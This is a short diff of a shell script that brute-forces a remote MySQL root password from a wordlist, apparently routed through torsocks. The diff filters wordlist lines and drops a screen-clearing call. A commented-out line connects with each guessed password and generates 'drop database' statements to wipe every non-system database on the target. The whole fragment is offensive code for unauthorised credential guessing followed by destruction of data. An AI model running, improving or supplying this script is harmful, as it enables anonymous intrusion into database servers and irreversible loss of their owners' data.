@@ -13,7 +13,7 @@ read address
 item=0
 correct=Database
 
-(cat $fileName | while read pw; do
+(cat $fileName | grep -v " " | while read pw; do
 	item=`expr $item + 1`
 	# Calculate the percentage of tryed passwords.
 	percent=$((100*$item/$total))
@@ -27,7 +27,6 @@ correct=Database
 		echo "Found password"
 		exit
 	fi ) &
-	clear
 
 	####	The command under here tryes to connect and drops ALL databases if it is successful.	####
 	#torsocks mysql -h $address -u root -p$pw  -e "show databases" | grep -v Database | grep -v mysql| grep -v information_schema| grep -v test | grep -v OLD |gawk '{print "drop database " $1 ";select sleep(0.1);"}' | mysql -u root -p$pw
